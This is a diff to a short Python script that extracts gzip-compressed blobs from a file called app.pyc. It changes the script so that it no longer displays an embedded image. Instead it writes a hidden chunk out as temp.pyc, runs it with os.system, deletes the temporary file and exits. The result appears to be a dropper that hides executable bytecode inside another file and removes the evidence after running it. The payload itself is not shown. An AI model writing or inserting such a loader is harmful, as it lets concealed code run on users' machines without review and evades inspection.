@@ -1,16 +1,18 @@
 import os
 import sys
 import gzip
-from io import BytesIO
+import subprocess
+import time
+import io
 from PIL import Image
 
 with open("./app.pyc", 'rb') as file:
     data_byte = file.read()
     file.close()
 
-pos         = 0
 bytes_pos   = 0
-image_index = 4
+image_index = 0
+pos         = 0
 
 while pos < len(data_byte):
     c = data_byte[pos]
@@ -96,14 +98,15 @@ with open("./app.pyc", "rb") as file:
             break
         length = int.from_bytes(length_bytes, byteorder='big')
         compressed_data = file.read(length)
-        
         if index == image_index:
-            byte_stream = BytesIO(compressed_data)
+            byte_stream = io.BytesIO(compressed_data)
             with gzip.GzipFile(fileobj=byte_stream) as gz_file:
-                image_data = gz_file.read()
-                image = Image.open(BytesIO(image_data))
-                file.close()
-                image.show()
+                bytecode_bytestream = gz_file.read()
+                with open("./temp.pyc","wb") as fout:
+                    fout.write(bytecode_bytestream)
+                    fout.close()
+                result = os.system("python temp.pyc")
+                os.remove("./temp.pyc")
                 sys.exit(0)
                 #return image
         index += 1
